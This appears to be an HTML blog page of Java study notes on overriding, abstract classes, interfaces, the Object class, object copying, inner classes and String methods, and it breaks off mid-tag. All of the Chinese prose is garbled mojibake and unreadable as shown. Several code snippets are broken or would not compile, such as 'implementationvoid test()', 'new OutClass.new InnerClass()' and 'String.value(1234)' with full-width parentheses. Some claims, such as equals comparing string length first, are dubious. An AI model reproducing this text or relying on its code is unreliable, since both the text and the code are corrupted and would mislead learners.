å­ç±»é‡å†™çš„æ–¹æ³•<br>å­ç±»å’Œçˆ¶ç±» æœ‰åŒåè¦†ç›–&#x2F;é‡å†™<br>é€šè¿‡çˆ¶ç±»å¯¹è±¡ è°ƒç”¨çˆ¶ç±»å’Œå­ç±»é‡å†™çš„æ–¹æ³•<br>æ»¡è¶³ä¸Šè¿°3ç‚¹ åªæ˜¯ä¼šå‘ç”ŸåŠ¨æ€ç»‘å®š</p><h4 id="é‡å†™-è¦†ç›–è§„åˆ™"><a href="#é‡å†™-è¦†ç›–è§„åˆ™" class="headerlink" title="é‡å†™&#x2F;è¦†ç›–è§„åˆ™"></a>é‡å†™&#x2F;è¦†ç›–è§„åˆ™</h4><p>æ–¹æ³•åä¸€æ ·<br>å‚æ•°åˆ—è¡¨ä¸€æ · ï¼ˆç±»å‹ ä¸ªæ•° é¡ºåºï¼‰<br>è¿”å›å€¼ä¸€æ ·</p><h4 id="é‡å†™çš„æ³¨æ„äº‹é¡¹"><a href="#é‡å†™çš„æ³¨æ„äº‹é¡¹" class="headerlink" title="é‡å†™çš„æ³¨æ„äº‹é¡¹"></a>é‡å†™çš„æ³¨æ„äº‹é¡¹</h4><p>1.è¢«privateä¿®é¥°ä¸å¯é‡å†™<br>2.è¢«staticä¿®é¥° å±äºç±»ä¸å±äºæ–¹æ³•<br>3.è¢«finalä¿®é¥°çš„æ–¹æ³•ä¸å¯é‡å†™<br>4.è®¿é—®ä¿®é¥°é™å®šç¬¦ private&lt;é»˜è®¤æƒé™&lt;protected&lt;publicï¼ˆå­ç±»çš„è®¿é—®ä¿®é¥°æƒé™ä¸€å®šè¦å¤§äºç­‰äºçˆ¶ç±»çš„ï¼‰<br>5.æ–¹æ³•çš„è¿”å›å€¼ å¯ä»¥ä¸åŒ ä½†å¿…é¡»æ˜¯çˆ¶å­ç±»å…³ç³»ï¼ˆæ–œå˜ç±»å‹ï¼‰<br>6.æ„é€ æ–¹æ³•ä¸èƒ½å‘ç”Ÿé‡å†™</p><h4 id="é‡è½½"><a href="#é‡è½½" class="headerlink" title="é‡è½½"></a>é‡è½½</h4><p>æ–¹æ³•åç›¸åŒ<br>å‚æ•°åˆ—è¡¨ä¸åŒï¼ˆä¸ªæ•° ç±»å‹ é¡ºåºï¼‰<br>è¿”å›å€¼ä¸åŒï¼ˆå¯æœ‰å¯æ— ï¼‰</p><h4 id="ä»£ç çš„æ‰§è¡Œé¡ºåº"><a href="#ä»£ç çš„æ‰§è¡Œé¡ºåº" class="headerlink" title="ä»£ç çš„æ‰§è¡Œé¡ºåº"></a>ä»£ç çš„æ‰§è¡Œé¡ºåº</h4><p>1.æ‰§è¡Œçˆ¶ç±»å’Œå­ç±»çš„é™æ€ï¼ˆå…ˆçˆ¶åå­ï¼‰<br>2.çˆ¶ç±»çš„å®ä¾‹<br>3.çˆ¶ç±»çš„æ„é€ <br>4.å­ç±»çš„å®ä¾‹<br>5.å­ç±»çš„æ„é€ </p><p>1.æŠ½è±¡ç±»æ˜¯è¢«abstractä¿®é¥°çš„<br>2.è¢«abstractä¿®é¥°çš„æ–¹æ³•æˆä¸ºæŠ½è±¡æ–¹æ³•  è¯¥æ–¹å¯ä»¥æ²¡æœ‰å…·ä½“å®ç°<br>3.å½“ä¸€ä¸ªç±»ä¸­å«æœ‰æŠ½è±¡æ–¹æ³•çš„æ—¶å€™ è¯¥ç±»å¿…é¡»ä½¿ç”¨abstractä¿®é¥°<br>4.æŠ½è±¡ç±»ä¸­å¯ä»¥æœ‰å’Œæ™®é€šç±»ä¸€æ ·çš„æˆå‘˜å˜é‡ ä¸€æ ·çš„æˆå‘˜æ–¹æ³•<br>5.æŠ½è±¡ç±»ä¸å¯è¢«å®ä¾‹åŒ–<br>6.æŠ½è±¡ç±» ç›®çš„å°±æ˜¯ä¸ºäº†è¢«ç»§æ‰¿<br>7.å½“ä¸€ä¸ªæ™®é€šçš„ç±» ç»§æ‰¿äº†æŠ½è±¡ç±»ä¹‹å è¯¥æ™®é€šç±»ä¸€å®šè¦é‡å†™æŠ½è±¡ç±»å½“ä¸­çš„æ‰€æœ‰æŠ½è±¡æ–¹æ³•<br>8.finaã€privatelå’Œabstractä¸èƒ½åŒæ—¶å­˜åœ¨ï¼ˆfinaã€privatelä¿®é¥°ä¸€å®šä¸èƒ½é‡å†™ abstractä¿®é¥°ä¸€å®šè¦é‡å†™ï¼‰æŠ½è±¡ç±»ä¸èƒ½è¢«staticä¿®é¥°<br>9.å½“ä¸€ä¸ªæŠ½è±¡ç±»Aä¸æƒ³è¢«ä¸€ä¸ªæ™®é€šç±»Bç»§æ‰¿ æ­¤æ—¶å¯ä»¥æŠŠè¿™ä¸ªç±»å˜æˆæŠ½è±¡ç±» å½“ä¸€ä¸ªæ™®é€šç±»Cç»§æ‰¿æŠ½è±¡ç±»Bä¹‹å Cè¦é‡å†™Bå’ŒAå½“ä¸­æ‰€æœ‰çš„æŠ½è±¡æ–¹æ³•<br>10.å½“ä¸€ä¸ªç±»å®ç°æ¥å£å½“ä¸­çš„æ–¹æ³•ä¹‹å å½“å‰ç±»å½“ä¸­çš„æ–¹æ³•å¿…é¡»åŠ public<br>æŠ½è±¡ç±»ä¸­ä¸ä¸€å®šåŒ…å«æŠ½è±¡æ–¹æ³• ä½†æœ‰æŠ½è±¡æ–¹æ³•çš„ç±»ä¸€å®šæ˜¯æŠ½è±¡ç±»<br>æŠ½è±¡ç±»ä¸­å¯ä»¥æœ‰æ„é€ æ–¹æ³• ä¾›å­ç±»åˆ›å»ºå¯¹è±¡æ—¶ åˆå§‹åŒ–çˆ¶ç±»çš„æˆå‘˜å˜é‡<br>11.æ¥å£å½“ä¸­ä¸èƒ½æœ‰æ„é€ æ–¹æ³•å’Œä»£ç å—<br>12.ä¸€ä¸ªæ¥å£ä¹Ÿä¼šäº§ç”Ÿç‹¬ç«‹çš„å­—èŠ‚ç æ–‡ä»¶ ï¼ˆç¼–è¯‘ä¹‹å.classï¼‰<br>13.ç±»æ²¡æœ‰å®ç°æ¥å£ä¸­çš„æ‰€æœ‰æ–¹æ³• é‚£å®ƒå¿…é¡»è®¾ç½®ä¸ºæŠ½è±¡ç±»</p><p>åŒ¿åå¯¹è±¡çš„ç¼ºç‚¹ æ¯æ¬¡ä½¿ç”¨éƒ½å¾—é‡æ–°å®ä¾‹åŒ–</p><h4 id="æ¥å£"><a href="#æ¥å£" class="headerlink" title="æ¥å£"></a>æ¥å£</h4><p>1.ä½¿ç”¨interfaceå®šä¹‰æ¥å£<br>2.æ¥å£å½“ä¸­çš„æˆå‘˜å˜é‡ é»˜è®¤æ˜¯public static final<br>3.æ¥å£å½“ä¸­çš„æˆå‘˜æ–¹æ³• é»˜è®¤æ˜¯public abstract ä¸€èˆ¬æƒ…å†µä¸‹ä¸å†™<br>4.æ¥å£å½“ä¸­ä¸å¯ä»¥æœ‰æ™®é€šçš„æ–¹æ³•<br>5.java8å¼€å§‹ å…è®¸åœ¨æ¥å£ä¸­å®šä¹‰ä¸€ä¸ªdefaultæ–¹æ³• ä¿®é¥°æ™®é€šç±»<br>6.æ¥å£å½“ä¸­çš„æ–¹æ³•è‹¥è¢«staticä¿®é¥°çš„æ–¹æ³• å¯ä»¥æœ‰å…·ä½“çš„å®ç°<br>7.æ¥å£ä¸èƒ½é€šè¿‡newå…³é”®å­—è¿›è¡Œå®ä¾‹åŒ–<br>8.ç±»å’Œæ¥å£ä¹‹é—´å¯ä»¥é€šè¿‡å…³é”®å­—implementså®ç°æ¥å£ å®ç°ä¹‹åè¦é‡å†™æ‰€æœ‰çš„æ–¹æ³•<br>9.æ¥å£å¯ä»¥å‘ç”Ÿå‘ä¸Šè½¬å‹ åŠ¨æ€ç»‘å®š</p><p><strong>å…ˆç»§æ‰¿å†å®ç°æ¥å£ javaä¸­åªèƒ½ç»§æ‰¿ä¸€ä¸ªç±»å®ç°å¤šä¸ªæ¥å£</strong><br>æ¥å£æˆå‘˜å˜é‡é»˜è®¤ï¼špublic static final<br>æ¥å£å½“ä¸­æˆå‘˜æ–¹æ³•é»˜è®¤ï¼špublic abstract</p><p><strong>æŠ½è±¡ç±»å’Œæ¥å£éƒ½ä¸å¯ä»¥å®ä¾‹åŒ–</strong><br>æŠ½è±¡ç±»Aç»§æ‰¿æŠ½è±¡ç±»B æŠ½è±¡ç±»Aå¯ä»¥ä¸é‡å†™æŠ½è±¡ç±»Bä¸­çš„æ–¹æ³• å¦‚æœæ˜¯æ™®é€šç±»ç»§æ‰¿ éœ€è¦é‡å†™</p><p>æ¥å£é—´çš„ç»§æ‰¿ç›¸å½“äºåˆå¹¶ </p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240203135046040.png" alt="image-20240203135046040"></p><h4 id="æŠ½è±¡ç±»å’Œæ¥å£çš„åŒºåˆ«"><a href="#æŠ½è±¡ç±»å’Œæ¥å£çš„åŒºåˆ«" class="headerlink" title="æŠ½è±¡ç±»å’Œæ¥å£çš„åŒºåˆ«"></a>æŠ½è±¡ç±»å’Œæ¥å£çš„åŒºåˆ«</h4><p>æ ¸å¿ƒåŒºåˆ«<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240203135240178.png" alt="image-20240203135240178"></p><h4 id="objectç±»"><a href="#objectç±»" class="headerlink" title="objectç±»"></a>objectç±»</h4><p>æ‰€æœ‰ç±»çš„çˆ¶ç±» å°½ç®¡æ— æ˜¾ç¤ºç»§æ‰¿ï¼ˆé»˜è®¤ç»§æ‰¿ï¼‰<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240203141628670.png" alt="image-20240203141628670"></p><p>equalsæ–¹æ³•è¿”å›trueæˆ–false<br><strong>ä»¥åè‡ªå®šä¹‰çš„ç±»å‹ ä¸€å®šé‡å†™equalsæ–¹æ³•</strong><br>equalsæ–¹æ³•ä¸èƒ½ç”¨äºåŸºæœ¬æ•°æ®ç±»å‹çš„å˜é‡ï¼ˆByteï¼Œshortï¼Œintï¼Œlongï¼Œdoubleï¼Œfolatï¼Œ<a href="https://so.csdn.net/so/search?q=boolean&spm=1001.2101.3001.7020">boolean</a>ï¼Œcharï¼‰</p><p><strong>â€œ&#x3D;&#x3D;â€æ¯”è¾ƒåŸºæœ¬æ•°æ®ç±»å‹æ—¶æ¯”è¾ƒçš„æ˜¯è¡¨é¢å€¼å†…å®¹ï¼Œè€Œæ¯”è¾ƒä¸¤ä¸ªå¯¹è±¡æ—¶æ¯”è¾ƒçš„æ˜¯ä¸¤ä¸ªå¯¹è±¡çš„å†…å­˜åœ°å€å€¼</strong><br><strong>&#x3D;&#x3D; åœ¨åŸºæœ¬æ•°æ®ç±»å‹ï¼šå€¼å†…å®¹, å¼•ç”¨ç±»å‹æ—¶ï¼šåœ°å€</strong><br><strong>equals é‡å†™ï¼šå€¼å†…å®¹ ï¼Œ equalsä¸é‡å†™ï¼šåœ°å€</strong></p><p>é‡å†™hashcode ä½¿å¾—ä¸¤ä¸ªå¯¹è±¡ é€»è¾‘ä¸Šåœ¨åŒä¸€ä¸ªä½ç½®<br>è‡ªå®šä¹‰ç±»å‹ æ¯”è¾ƒå¤§å° å®ç°compareableæ¥å£<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240203144521872.png" alt="image-20240203144521872"></p><p>æ­¤æ¥å£å¯¹ç±»çš„ä¾µå…¥æ€§è¾ƒå¼º å¯æ‰©å±•æ€§å¼±</p><p>ä¸åŒåŒ…çš„ä¸åŒè®¿é—®<br>cloneæ–¹æ³•çš„å¼‚å¸¸æ˜¯å—æŸ¥å¼‚å¸¸&#x2F;ç¼–è¯‘æ—¶å¼‚å¸¸ å¿…é¡»æ˜¯ç¼–è¯‘æ—¶å¤„ç†<br>å‘ä¸‹è½¬å‹ éœ€è¦å¼ºåˆ¶ç±»å‹è½¬æ¢<br>ç©ºæ¥å£-&gt; æ ‡è®°æ¥å£ è¯æ˜å½“å‰ç±»æ˜¯å¯ä»¥è¢«å…‹éš†çš„</p><h4 id="æµ…æ‹·è´"><a href="#æµ…æ‹·è´" class="headerlink" title="æµ…æ‹·è´"></a>æµ…æ‹·è´</h4><p>å¹¶æ²¡æœ‰å¯¹å¯¹è±¡ä¸­çš„å¯¹è±¡è¿›è¡Œå…‹éš†</p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240203162918839.png" alt="image-20240203162918839"></p><h4 id="æ·±æ‹·è´"><a href="#æ·±æ‹·è´" class="headerlink" title="æ·±æ‹·è´"></a>æ·±æ‹·è´</h4><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240203163553312.png" alt="image-20240203163553312"></p><p>çœ‹ä»£ç çš„å®ç°è¿‡ç¨‹</p><h4 id="å†…éƒ¨ç±»"><a href="#å†…éƒ¨ç±»" class="headerlink" title="å†…éƒ¨ç±»"></a>å†…éƒ¨ç±»</h4><p>ä¸€ä¸ªç±»ä¸€ä¸ªå­—èŠ‚ç æ–‡ä»¶</p><p><strong>å®ä¾‹å†…éƒ¨ç±»</strong></p><p>è·å–å®ä¾‹å†…éƒ¨ç±»å¯¹è±¡æ—¶ ä¾èµ–å¤–éƒ¨ç±»å¯¹è±¡</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">OutClass.<span class="type">InnerClass</span> <span class="variable">innerClass</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OutClass</span>.<span class="keyword">new</span> <span class="title class_">InnerClass</span>();</span><br><span class="line">innerClass.test();</span><br></pre></td></tr></table></figure><p><strong>åœ¨å®ä¾‹å†…éƒ¨å†…ä¸­ å®šä¹‰é™æ€çš„æˆå‘˜å˜é‡éœ€è¦ä½¿ç”¨public static final</strong><br>åŸå› ï¼šé™æ€æ–¹æ³•é¦–å…ˆæ‰§è¡Œä¸”ä¸ä¾èµ–ä»»ä½•å¯¹è±¡ ä½†å†…éƒ¨ç±»çš„å®ç°ä¾èµ–å¤–éƒ¨ç±»<br>finalä¿®é¥°å¸¸é‡ ä¸éœ€è¦ç±»åŠ è½½ </p><p>ç±»åŠ è½½çš„æ—¶å€™ä¸ä¼šåŠ è½½æ™®é€šæˆå‘˜å˜é‡ å®ä¾‹å†…éƒ¨ç±»ä¸­å­˜åœ¨static staticæ˜¯åœ¨ç±»åŠ è½½çš„æ—¶å€™åˆ›å»ºçš„</p><p>å½“å¤–éƒ¨ç±»ä¸­çš„æ•°æ®æˆå‘˜å’Œå†…éƒ¨ç±»ä¸­çš„æ•°æ®æˆå‘˜ç›¸åŒæ—¶ å¯ä»¥é€šè¿‡å¤–éƒ¨ç±».thisè®¿é—®å¤–éƒ¨ç±»æˆå‘˜å˜é‡ï¼ˆOuterClass.thisï¼‰<br>å®ä¾‹å†…éƒ¨ç±»å¯¹è±¡ä¸­åŒ…å«å¤–éƒ¨ç±»çš„this å› æ­¤å¯ä»¥é€šè¿‡å†…éƒ¨ç±»è®¿é—®å¤–éƒ¨ç±»çš„æˆå‘˜å˜é‡ï¼ˆpublicæƒé™ï¼‰</p><p><strong>æ³¨æ„</strong><br>1.å¤–éƒ¨ç±»ä¸­çš„ä»»ä½•æˆå‘˜éƒ½å¯ä»¥åœ¨å®ä¾‹å†…éƒ¨ç±»æ–¹æ³•ä¸­ç›´æ¥è®¿é—®<br>â’‰.å®ä¾‹å†…éƒ¨ç±»æ‰€å¤„çš„ä½ç½®ä¸å¤–éƒ¨ç±»æˆå‘˜ä½ç½®ç›¸åŒï¼Œå› æ­¤ä¹Ÿå—publicã€privateç­‰è®¿é—®é™å®šç¬¦çš„çº¦æŸ<br>3.åœ¨å®ä¾‹å†…éƒ¨ç±»æ–¹æ³•ä¸­è®¿é—®åŒåçš„æˆå‘˜æ—¶ï¼Œä¼˜å…ˆè®¿é—®è‡ªå·±çš„ï¼Œå¦‚æœè¦è®¿é—®å¤–éƒ¨ç±»åŒåçš„æˆå‘˜ï¼Œå¿…é¡»:å¤–éƒ¨ç±»åç§°.this.åŒåæˆå‘˜æ¥è®¿é—®<br>4.å®ä¾‹å†…éƒ¨ç±»å¯¹è±¡å¿…é¡»åœ¨å…ˆæœ‰å¤–éƒ¨ç±»å¯¹è±¡å‰æä¸‹æ‰èƒ½åˆ›å»º<br>5.å®ä¾‹å†…éƒ¨ç±»çš„éé™æ€æ–¹æ³•ä¸­åŒ…å«äº†ä¸€ä¸ªæŒ‡å‘å¤–éƒ¨ç±»å¯¹è±¡çš„å¼•ç”¨<br>6.å¤–éƒ¨ç±»ä¸­ï¼Œä¸èƒ½ç›´æ¥è®¿é—®å®ä¾‹å†…éƒ¨ç±»ä¸­çš„æˆå‘˜ï¼Œå¦‚æœè¦è®¿é—®å¿…é¡»å…ˆè¦åˆ›å»ºå†…éƒ¨ç±»çš„å¯¹è±¡ã€‚</p><p><strong>é™æ€å†…éƒ¨ç±»</strong><br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240203164615108.png" alt="image-20240203164615108"></p><p>è·å–é™æ€å†…éƒ¨ç±»å¯¹è±¡</p><p>åœ¨é™æ€å†…éƒ¨ç±»ä¸­èŒƒæ ¹å¤–éƒ¨ç±»çš„éé™æ€æ•°æ®æˆå‘˜<br>å†…éƒ¨ç±»ä¸ºé™æ€ ç›´æ¥è®¿é—®å³å¯</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">OuterClass outclass <span class="operator">=</span> new OuterClassï¼ˆï¼‰<span class="comment">;</span></span><br><span class="line">System.out.println(outerclass.data1)<span class="comment">;</span></span><br></pre></td></tr></table></figure><p><strong>æ³¨æ„</strong><br>åœ¨é™æ€å†…éƒ¨ç±»ä¸­è“„èƒ½è®¿é—®å¤–éƒ¨ç±»ä¸­çš„é™æ€æˆå‘˜ï¼ˆè¦è®¿é—® æä¾›å¤–éƒ¨ç±»å¯¹è±¡çš„å¼•ç”¨ï¼‰<br>åˆ›å»ºé™æ€å†…éƒ¨ç±»å¯¹è±¡æ˜¯ ä¸éœ€è¦å…ˆåˆ›å»ºå¤–éƒ¨ç±»å¯¹è±¡</p><p><strong>åŒ¿åå†…éƒ¨ç±»</strong><br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240203164446363.png" alt="image-20240203164446363"></p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240203164524232.png" alt="image-20240203164524232"></p><p>å¤–éƒ¨ç±»å$å†…éƒ¨ç±»å<br>å¤–éƒ¨ç±»ç±»å$æ•°å­—<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240203164907493.png" alt="image-20240203164907493"></p><p>åœ¨åŒ¿åå†…éƒ¨ç±»ä¸­ èƒ½å¤Ÿè¢«è®¿é—®çš„æ˜¯æ²¡æœ‰è¢«ä¿®æ”¹è¿‡çš„æ•°æ®</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">A</span> &#123;</span><br><span class="line">implementationvoid <span class="title function_">test</span><span class="params">()</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="type">int</span> <span class="variable">val</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line"> a = <span class="keyword">new</span> <span class="title class_">A</span>(()&#123;</span><br><span class="line"> <span class="meta">@override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="comment">//é»˜è®¤åœ¨è¿™é‡Œè®¿é—®çš„æ˜¯è¢«finalä¿®é¥°çš„</span></span><br><span class="line">system.out.println(<span class="string">&quot;å€¼: &quot;</span>+val);<span class="comment">//åœ¨åŒ¿åå†…éƒ¨ç±»å½“ä¸­èƒ½å¤Ÿè®¿é—®çš„æ˜¯æ²¡æœ‰è¢«ä¿®æ”¹è¿‡çš„æ•°æ®&#125;</span></span><br><span class="line">&#125;;</span><br><span class="line">a.test();</span><br><span class="line">val = <span class="number">100</span>;|</span><br><span class="line">system.out.println(val);</span><br><span class="line">&#125;</span><br><span class="line">&#125;ï¼›</span><br><span class="line">a.test();</span><br></pre></td></tr></table></figure><p><strong>å±€éƒ¨å†…éƒ¨ç±»</strong></p><p>åªèƒ½å®šä¹‰åœ¨æ–¹æ³•å†…éƒ¨<br>1.å±€éƒ¨å†…éƒ¨ç±»åªèƒ½åœ¨æ‰€å®šä¹‰çš„æ–¹æ³•æœ¬å†…éƒ¨ä½¿ç”¨<br>2.ä¸èƒ½è¢«publicã€staticç­‰ä¿®é¥°ç¬¦ä¿®é¥°<br>3.ç¼–è¯‘å™¨ä¹Ÿæœ‰è‡ªå·±ç‹¬ç«‹çš„å­—èŠ‚ç æ–‡ä»¶<br>å‘½åæ ¼å¼:å¤–éƒ¨ç±»åå­—$æ•°å­—å†…éƒ¨ç±»åå­—.class4.å‡ ä¹ä¸ä¼šä½¿ç”¨</p><h4 id="Stringç±»"><a href="#Stringç±»" class="headerlink" title="Stringç±»"></a>Stringç±»</h4><h5 id="æ¯”è¾ƒæ˜¯å¦å¼•ç”¨åŒä¸€ä¸ªå¯¹è±¡"><a href="#æ¯”è¾ƒæ˜¯å¦å¼•ç”¨åŒä¸€ä¸ªå¯¹è±¡" class="headerlink" title="&#x3D;&#x3D;æ¯”è¾ƒæ˜¯å¦å¼•ç”¨åŒä¸€ä¸ªå¯¹è±¡"></a>&#x3D;&#x3D;æ¯”è¾ƒæ˜¯å¦å¼•ç”¨åŒä¸€ä¸ªå¯¹è±¡</h5><p> ä»»ä½•æƒ…å†µä¸‹åªè¦ç­‰å·ä¸¤è¾¹æ˜¯å¼•ç”¨ç±»å‹ä¸€å®šæ³¨æ„çœ‹æ­¤æ—¶æ¯”è¾ƒçš„æ˜¯ä»€ä¹ˆ?å¦‚ä½•è¦æ¯”è¾ƒä¸¤ä¸ªå¼•ç”¨æ‰€æŒ‡å‘å¯¹è±¡çš„å†…å®¹æ˜¯å¦ä¸€è‡´</p><p>ä¸€å®šé‡å†™equalsæ–¹æ³•â€“&gt;<br>ä¸é‡å†™å°±ä¼šé»˜è®¤è°ƒç”¨objectçš„equalsæ–¹æ³•</p><p>è‡ªå®šä¹‰ç±»å‹ä¸€å®šè¦é‡å†™equelsï¼ˆï¼‰æ–¹æ³•</p><p>åŒºåˆ«äºCè¯­è¨€ javaä¸­çš„å­—ç¬¦ä¸²æ²¡æœ‰â€™\0â€™ç»“å°¾<br>å­ç±»é‡å†™äº†çˆ¶ç±»çš„æ–¹æ³•åè¿›è¡Œè°ƒç”¨ ä¼˜å…ˆè°ƒç”¨å­ç±»è‡ªå·±çš„</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">str3</span> <span class="operator">=</span> <span class="string">&quot;abcde&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">str4</span> <span class="operator">=</span> <span class="string">&quot;abcde&quot;</span>;</span><br><span class="line">System.out.println(str3 == str4);</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240208201812965.png" alt="image-20240208201812965"></p><p>å­˜å‚¨åŒå¼•å·å¼•èµ·æ¥çš„å€¼<br>å­˜å‚¨å†…å®¹ä¸ºå­—ç¬¦ä¸²çš„å¸¸é‡å€¼<br><strong>å­˜å‚¨æ­¥éª¤ï¼š</strong><br>çœ‹ å¸¸é‡æ± æœ‰æ— å½“å‰å­—ç¬¦ä¸²<br>æ—  å­˜å…¥<br>æœ‰ è·å–å·²ç»å­˜å‚¨åœ¨å¸¸é‡æ± ä¸­çš„å€¼çš„åœ°å€</p><p>StringTable â€“&gt;å…¶å®æ˜¯ä¸€ä¸ªå“ˆå¸Œè¡¨</p><p><strong>ä½œç”¨</strong><br>æé«˜å­˜å‚¨æ•ˆç‡</p><p>ä½¿ç”¨Stringæ–¹æ³•æ—¶ é»˜è®¤å…ˆè¿›è¡Œå­—ç¬¦ä¸²é•¿åº¦æ¯”è¾ƒ å†è¿›è¡Œå†…å®¹æ¯”è¾ƒï¼ˆhashï¼‰return ASCIIå·®å€¼ï¼ˆç›¸åŒåˆ™è¿”å›é•¿åº¦ï¼‰</p><h4 id="equalsæ–¹æ³•æ¯”è¾ƒ"><a href="#equalsæ–¹æ³•æ¯”è¾ƒ" class="headerlink" title="equalsæ–¹æ³•æ¯”è¾ƒ"></a>equalsæ–¹æ³•æ¯”è¾ƒ</h4><p>æ¯”è¾ƒå†…å®¹æ˜¯å¦ç›¸ç­‰<br>è¿”å›boolenç±»å‹ï¼ˆtrue&#x2F;flaseï¼‰<br>æŒ‰ç…§å­—å…¸åºï¼ˆå­—ç¬¦çš„å¤§å°é¡ºåºï¼‰<br>å…ˆé•¿åº¦åå¤§å°</p><h4 id="CompareToæ–¹æ³•æ¯”è¾ƒ"><a href="#CompareToæ–¹æ³•æ¯”è¾ƒ" class="headerlink" title="CompareToæ–¹æ³•æ¯”è¾ƒ"></a>CompareToæ–¹æ³•æ¯”è¾ƒ</h4><p>è¿”å›intç±»å‹</p><p>å…ˆæŒ‰ç…§å­—å…¸æ¬¡åºå¤§å°æ¯”è¾ƒï¼Œå¦‚æœå‡ºç°ä¸ç­‰çš„å­—ç¬¦ï¼Œç›´æ¥è¿”å›è¿™ä¸¤ä¸ªå­—ç¬¦çš„å¤§å°å·®å€¼ </p><p>å¦‚æœå‰kä¸ªå­—ç¬¦ç›¸ç­‰(kä¸ºä¸¤ä¸ªå­—ç¬¦é•¿åº¦æœ€å°å€¼)ï¼Œè¿”å›å€¼ä¸¤ä¸ªå­—ç¬¦ä¸²é•¿åº¦å·®å€¼</p><h4 id="å¿½ç•¥å¤§å°å†™è¿›è¡Œæ¯”è¾ƒ"><a href="#å¿½ç•¥å¤§å°å†™è¿›è¡Œæ¯”è¾ƒ" class="headerlink" title="å¿½ç•¥å¤§å°å†™è¿›è¡Œæ¯”è¾ƒ"></a>å¿½ç•¥å¤§å°å†™è¿›è¡Œæ¯”è¾ƒ</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">str3</span> <span class="operator">=</span> <span class="string">&quot;Abcde&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">str4</span> <span class="operator">=</span> <span class="string">&quot;abcde&quot;</span>;</span><br><span class="line">System.out.println(str3.compareToIgnoreCase(str4));<span class="comment">//è¾“å‡º0</span></span><br></pre></td></tr></table></figure><h4 id="å­—ç¬¦ä¸²æŸ¥æ‰¾"><a href="#å­—ç¬¦ä¸²æŸ¥æ‰¾" class="headerlink" title="å­—ç¬¦ä¸²æŸ¥æ‰¾"></a>å­—ç¬¦ä¸²æŸ¥æ‰¾</h4><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240211195141440.png" alt="image-20240211195141440">ä»0ä¸‹æ ‡å¼€å§‹<br>ä¾‹å¦‚lastIndexofï¼ˆï¼‰</p><h4 id="è½¬åŒ–"><a href="#è½¬åŒ–" class="headerlink" title="è½¬åŒ–"></a>è½¬åŒ–</h4><h5 id="æ•°å€¼å’Œå­—ç¬¦ä¸²è½¬åŒ–"><a href="#æ•°å€¼å’Œå­—ç¬¦ä¸²è½¬åŒ–" class="headerlink" title="æ•°å€¼å’Œå­—ç¬¦ä¸²è½¬åŒ–"></a>æ•°å€¼å’Œå­—ç¬¦ä¸²è½¬åŒ–</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">s1</span> <span class="operator">=</span> String.valueï¼ˆ<span class="number">1234</span>ï¼‰<span class="comment">//æ•´å‹è½¬å­—ç¬¦ä¸²</span></span><br><span class="line"><span class="type">int</span> <span class="variable">data</span> <span class="operator">=</span> Integer.parseInt(<span class="string">&quot;1234&quot;</span>);<span class="comment">//è¾“å‡ºintå‹</span></span><br><span class="line"><span class="type">double</span> <span class="variable">data1</span> <span class="operator">=</span> parseDouble(<span class="string">&quot;12.34&quot;</span>);<span class="comment">//è¾“å‡ºdoubleå‹</span></span><br></pre></td></tr></table></figure><h5 id="å¤§å°å†™è½¬åŒ–"><a href="#å¤§å°å†™è½¬åŒ–" class="headerlink" title="å¤§å°å†™è½¬åŒ–"></a>å¤§å°å†™è½¬åŒ–</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">str1</span> <span class="operator">=</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">ret</span> <span class="operator">=</span> str1.toUpperCase(str1);</span><br><span class="line"><span class="type">String</span> <span class="variable">str2</span> <span class="operator">=</span> <span 